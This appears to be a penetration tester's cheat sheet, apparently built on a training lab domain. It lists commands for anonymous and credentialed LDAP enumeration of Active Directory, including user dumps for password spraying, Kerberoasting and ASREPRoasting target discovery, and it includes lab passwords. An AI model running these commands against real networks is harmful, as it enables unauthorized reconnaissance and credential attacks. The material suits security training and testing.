### LDAP Anonymous Bind
- LDAP anonymous binds _allow unauthenticated attackers to retrieve information_ from the domain, such as a full listing of users, groups, computers, user account attributes, and the domain password policy. 
- Attacker _does not need to know a base object_ to query a considerable amount of information from the domain. 

##### LDAP NULL Authentication
```python
from ldap3 import *
IP = ''
s = Server(IP,get_info = ALL)
c =  Connection(s, '', '')
c.bind()
s.info
```

##### rpcclient
```bash
rpcclient -U "" -N $IP
```
__Get All users__
```bash
enumdomusers
```
__Get Details__
```bash
queryuser $rid
```

##### Ldapsearch
We can confirm anonymous LDAP bind & retrieve all AD objects from LDAP.
```bash
ldapsearch -H ldap://$IP -x -b "dc=inlanefreight,dc=local"
```
__Get SAM Account Names__

```bash
ldapsearch -H ldap://$IP -x -D "" -w "" -b "dc=inlanefreight,dc=local" '(objectClass=Person)' 'sAMAccountName' | grep sAMAccountName | awk '{print $2}'
```

##### Windapsearch
- Below command can confirm _LDAP NULL session authentication_ and domain functional level
```bash
windapsearch --dc-ip $IP -u "" --functionality
```

__Pull a listing of domain users to use in a password spraying__
```bash
windapsearch --dc-ip $IP -u "" -U
```
- `-C` - computers

__Custom LDAP Filter__
```bash
windapsearch --dc-ip $IP --custom "objectClass=Person"
```

__SMARTCARD\_REQUIRED accts__
```bash
windapsearch --dc-ip $IP -u "" -p "" --custom "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=262144))"
```

__ENCRYPTED_TEXT_PWD_ALLOWED__
```bash
windapsearch --dc-ip $IP -u "" -p "" --custom "(userAccountControl:1.2.840.113556.1.4.803:=128)"
```

__Get Distinguished Name__
```bash
windapsearch.py --dc-ip 172.16.5.5 -u SAPService@INLANEFREIGHT.LOCAL -p '!SapperFi2' --custom '(sAMAccountName=SAPService)'
```
__Get groups of a user__
```bash
windapsearch.py --dc-ip $IP -u SAPService@INLANEFREIGHT.LOCAL -p '!SapperFi2' --custom '(member:1.2.840.113556.1.4.1941:=CN=SAPService,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)
```

> [ldapsearch-ad.py](https://github.com/yaap7/ldapsearch-ad) is similar to `windapsearch`.

---
### Credentialed LDAP Enumeration

__Domain Admins__
```bash
windapsearch --dc-ip $IP -u inlanefreight\\james.cross --da
```
__Password Policy__
```bash
ldapsearch-ad.py -l $IP -d inlanefreight -u james.cross -p Summer2020 -t pass-pols
```

__users who are subject to a _Kerberoasting_ attack__
```bash
ldapsearch-ad.py -l $IP -d inlanefreight -u james.cross -p Summer2020 -t kerberoast | grep servicePrincipalName:
```

__users that can be _ASREPRoasted___
```bash
ldapsearch-ad.py -l $IP -d inlanefreight -u james.cross -p Summer2020 -t asreproast
```

